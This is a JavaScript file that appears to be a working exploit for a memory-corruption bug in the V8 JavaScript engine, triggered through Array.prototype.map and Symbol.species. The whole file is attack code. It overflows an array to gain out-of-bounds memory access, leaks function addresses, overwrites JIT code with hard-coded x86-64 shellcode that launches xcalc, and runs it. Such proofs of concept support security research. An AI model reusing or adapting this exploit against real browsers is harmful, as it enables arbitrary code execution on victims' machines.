var target = null;

// This will be where we read leaked values.
var leak = null;

// This will be the arraybuffer we're overwriting.
var buf = null;

var code = function() {
    return 1;
}

code();

// this is the array type we're overflowing
class BuggyArray extends Array {
    constructor(len) {
        //%SystemBreak();
        super(1);

        // allocate target JSArray (hopefully right after the one we're overflowing).
        // make it a DoubleArray so we can leak pointers.
        //%SystemBreak();
        target = new Array(1.1, 1.1);

        // And one more (to the pointers of objects we're interested in).
        //leak = new TargetArray(1);
        //%SystemBreak();
        leak = new Array(target, code, null);

        // This is used for arbitrary read/write.
        //%SystemBreak();
        buf = new ArrayBuffer(4);
        leak[2] = buf;
    }
};

class MyArray extends Array {
    static get [Symbol.species]() {
        return BuggyArray;
    }
}

// for double <-> byte conversions.
var convert_buf = new ArrayBuffer(8);
var float64 = new Float64Array(convert_buf);
var uint8 = new Uint8Array(convert_buf);
var uint32 = new Uint32Array(convert_buf);
/*
function DoubleToBytesLog(dbl) {
    float64[0] = dbl;
    for (var i = 0; i < 8; i++) {
        console.log(uint8[i].toString(16));
    }
}
*/

// add int offset to uint64 (as a double).
function Uint64Add(dbl, to_add_int) {
    float64[0] = dbl;
    var lower_add = uint32[0] + to_add_int;
    if (lower_add > 0xffffffff) {
        lower_add &= 0xffffffff;
        uint32[1] += 1;
    }
    uint32[0] = lower_add;
    return float64[0];
}

a = new MyArray();
a.length = 9;  // enough to write into the next FixedArray's length.

// Memory layout looks like this:
// =====================================================================================================
// a BuggyArray (0x80) | a FixedArray (0x18) | target JSArray (0x30) | target FixedDoubleArray (0x18) |
// leak JSArray (0x30) | leak FixedArray (0x20) | buf ArrayBuffer
// ====================================================================================================
//
// We overwrite the length field in the TagetArray and its FixedArray.
// TargetArray length index is (offset to TargetArray + JSArray::kLengthOffset) / 8
// FixedArray length index is (offset to TargetArray + TargetArray length +
//                             FixedArray::kLenghtOffset) / 8
a[4] = 42;
a[8] = 42;

// Do the initial overwrite.
a.map(function(x) { return 1000000; });

// Now we have OOB read/write.
console.log(target.length);
/*
for (var i = 8; i < 32; i++) {
    console.log(i);
    DoubleToBytesLog(target[i]);
    console.log('====');
}
*/

// index is (offset to leak FixedArray + FixedArray::kHeaderSize) / 8
var target_code_addr = target[11];  // JSFunction for code()

// set ptr and length of array buffer to JSFunction to leak its code address.
target[17] = Uint64Add(target_code_addr, 56-1); // kCodeEntryOffset - 1 (to get rid of Object tag).

// set length to something big.
float64[0] = 0
uint8[6] = 0xff;
target[16] = float64[0];

var target2 = new Uint32Array(buf);
//console.log(target2.length);

uint32[0] = target2[0];
uint32[1] = target2[1];

target[17] = Uint64Add(float64[0], 128); // 128 = code header size

// ptrs are cached, so create a new Uint32Array to overwrite the code.
var target3 = new Uint32Array(buf);

// shellcode here (pop /usr/bin/xcalc).
target3[0] = 0x90909090;
target3[1] = 0x90909090;
target3[2] = 0x782fb848;
target3[3] = 0x636c6163;
target3[4] = 0x48500000;
target3[5] = 0x73752fb8;
target3[6] = 0x69622f72;
target3[7] = 0x8948506e;
target3[8] = 0xc03148e7;
target3[9] = 0x89485750;
target3[10] = 0xd23148e6;
target3[11] = 0x3ac0c748;
target3[12] = 0x50000030;
target3[13] = 0x4944b848;
target3[14] = 0x414c5053;
target3[15] = 0x48503d59;
target3[16] = 0x3148e289;
target3[17] = 0x485250c0;
target3[18] = 0xc748e289;
target3[19] = 0x00003bc0;
target3[20] = 0x050f00;

// win.
//%SystemBreak();
code();